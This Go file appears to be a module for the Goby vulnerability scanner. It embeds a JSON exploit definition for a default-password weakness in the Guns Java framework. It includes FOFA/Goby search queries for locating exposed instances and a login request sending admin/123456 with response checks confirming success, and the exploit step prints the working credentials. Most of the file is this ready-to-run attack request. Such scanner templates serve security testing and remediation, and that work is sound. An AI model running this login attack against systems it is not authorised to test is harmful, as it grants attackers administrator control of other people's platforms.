package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Guns login weak-pass vulnerability",
    "Description": "<p>Guns is a modern Java application development framework based on the mainstream technology Spring Boot2.</p><p>Guns has a default password vulnerability. Attackers can control the whole platform with the default password admin/123456 and operate core functions with administrator rights.</p>",
    "Product": "Guns",
    "Homepage": "https://www.javaguns.com/",
    "DisclosureDate": "2022-07-23",
    "Author": "橘先生",
    "FofaQuery": "body=\"data.responseJSON.message, {icon: 5, anim: 6})\" && body=\">帐号注册</a>\" && body=\"var Feng = {\" || title==\"登录 - Guns\"",
    "GobyQuery": "body=\"data.responseJSON.message, {icon: 5, anim: 6})\" && body=\">帐号注册</a>\" && body=\"var Feng = {\" || title==\"登录 - Guns\"",
    "Level": "1",
    "Impact": "<p>Guns has a default password vulnerability. Attackers can control the whole platform with the default password admin/123456 and operate core functions with administrator rights.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "https://gitee.com/stylefeng/guns"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/login?jstime=1659188893835",
                "follow_redirect": false,
                "header": {
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
                },
                "data_type": "text",
                "data": "username=admin&password=123456"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"code\":200,",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"success\":true",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"message\":\"\\u8BF7\\u6C42\\u6210\\u529F\",",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "application/json",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/login?jstime=1659188893835",
                "follow_redirect": false,
                "header": {
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
                },
                "data_type": "text",
                "data": "username=admin&password=123456"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"code\":200,",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"success\":true",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"message\":\"\\u8BF7\\u6C42\\u6210\\u529F\",",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "application/json",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|USername:admin  Password:123456||"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "7",
    "Translation": {
        "CN": {
            "Name": "Guns login 默认口令漏洞",
            "Product": "Guns",
            "Description": "<p><span style=\"color: rgb(41, 43, 44);\"></span><span style=\"color: rgba(0, 0, 0, 0.85);\">Guns是一个现代化<span style=\"color: rgba(0, 0, 0, 0.85); font-size: 16px;\">基于主流技术Spring Boot2</span>的Java应用开发基础框架。</span><span style=\"color: rgb(41, 43, 44);\"></span><br></p><p><span style=\"color: rgb(41, 43, 44);\"><span style=\"color: rgba(0, 0, 0, 0.85);\">Guns</span>存在默认口令漏洞,攻击者使用默认口</span>令 admin/123456<span style=\"color: rgb(41, 43, 44);\">即可控制整个平台，使用管理员权限操作核心的功能。</span></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p><span style=\"font-size: 16px; color: rgb(41, 43, 44);\"><span style=\"color: rgba(0, 0, 0, 0.85);\">Guns</span>存在默认口令漏洞,攻击者使用默认口</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">令 admin/123456</span><span style=\"font-size: 16px; color: rgb(41, 43, 44);\">即可控制整个平台，使用管理员权限操作核心的功能。</span><br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Guns login weak-pass vulnerability",
            "Product": "Guns",
            "Description": "<p>Guns is a modern Java application development framework based on the mainstream technology Spring Boot2.</p><p>Guns has a default password vulnerability. Attackers can control the whole platform with the default password admin/123456 and operate core functions with administrator rights.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p><span style=\"color: rgb(51, 51, 51); font-size: 16px;\">Guns has a default password vulnerability. Attackers can control the whole platform with the default password admin/123456 and operate core functions with administrator rights.</span><br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10695"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}